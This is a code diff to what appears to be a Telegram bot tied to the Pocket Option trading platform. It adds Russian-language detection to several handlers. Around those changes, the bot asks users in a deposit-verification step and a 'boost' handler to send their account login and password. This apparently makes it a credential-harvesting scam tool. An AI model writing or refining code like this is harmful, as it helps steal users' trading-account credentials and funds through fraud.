@@ -510,6 +510,12 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
         # This is a test user, grant them a test balance and go through normal flow
         await state.update_data(initial_balance=100.0)
         lang_sel = _get_user_lang(message.from_user.id)
+        try:
+            lc = (getattr(message.from_user, "language_code", "") or "").lower()
+            if lc.startswith("ru"):
+                lang_sel = "ru"
+        except Exception:
+            pass
         await send_message_with_photo(
             message=message,
             photo_name="gread need yuor lign password.jpg",
@@ -559,6 +565,12 @@ async def _verify_pocket_option_deposit(message: types.Message, state: FSMContex
         await wait_message.delete()
         # Запрашиваем у пользователя логин и пароль перед продолжением
         lang_sel = _get_user_lang(message.from_user.id)
+        try:
+            lc = (getattr(message.from_user, "language_code", "") or "").lower()
+            if lc.startswith("ru"):
+                lang_sel = "ru"
+        except Exception:
+            pass
         await send_message_with_photo(
             message=message,
             photo_name="gread need yuor lign password.jpg",
@@ -817,6 +829,12 @@ async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
     if not (email_ok and password_ok and uid_ok):
         await callback.answer("Будь ласка, надішліть ваш логін і пароль, щоб продовжити.", show_alert=True)
         lang_sel = _get_user_lang(callback.from_user.id)
+        try:
+            lc = (getattr(callback.from_user, "language_code", "") or "").lower()
+            if lc.startswith("ru"):
+                lang_sel = "ru"
+        except Exception:
+            pass
         await send_message_with_photo(
             message=callback,
             photo_name="gread need yuor lign password.jpg",
